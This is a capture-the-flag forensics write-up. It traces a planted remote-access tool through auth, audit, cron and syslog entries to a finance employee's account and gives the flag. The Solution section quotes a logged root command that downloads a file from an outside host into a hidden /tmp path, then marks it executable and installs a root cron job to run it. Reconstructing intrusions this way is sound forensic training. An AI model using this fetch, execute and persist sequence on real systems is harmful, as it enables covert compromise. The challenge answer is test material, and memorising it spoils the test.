# Corporate RAT!

**Category:** Forensics

**Flag:** `cdctf{Lamar Hackson}`

**Verification:** Derived from the supplied logs; checker acceptance was not documented.

## Challenge Overview

**Starting material:** `corpo_rat.zip`, which contains `auth.log`, `audit.log`, `cron.log`, `syslog`, and `users.txt`. The prompt asks for the employee's first and last name. Extract the archive and begin with a search for unusual executables, scheduler entries, and repeated outbound destinations. The hidden path `/tmp/.cache/.upd` links the four machine logs.

## Solution

Read the events in order. In `auth.log`, `lhackson` logs in by SSH on September 20 at 02:14:14, and the following session lines identify UID 1066. At 02:15:12, `sudo` records that same account running `curl -s -o /tmp/.cache/.upd http://203.0.113.77:8443/update` as root. At 02:15:39, it runs `chmod +x` on the downloaded file. At 02:17:10, it opens root's crontab for editing. These are recorded commands in the supplied logs, not steps needed to solve the puzzle.

Cross-check `audit.log` rather than relying on a username string alone. The `curl`, `chmod`, and `crontab` events all carry `auid=1066`, `ses=5071`, and the same SSH session context, even though `uid=0` and `euid=0` after `sudo`. The audit record for `crontab -u root -e` is followed by a successful edit of `/var/spool/cron/crontabs/root`. Then `cron.log` starts showing root running `/tmp/.cache/.upd` at 02:43:00 and about every twenty minutes thereafter. `audit.log` records the `.upd` process executing and making successful `connect` system calls. `syslog` shows traffic to `203.0.113.77:8443` at installation time and repeatedly near those scheduled runs. The logs support attribution of the installer and persistent network activity; they do not expose the contents of any transfer.

Finally, look up `lhackson` or UID 1066 in `users.txt`. Its entry is `lhackson  1066  Lamar Hackson  Finance  no  /bin/bash`. This maps the technical account to the requested employee name.

## Flag

```text
cdctf{Lamar Hackson}
```
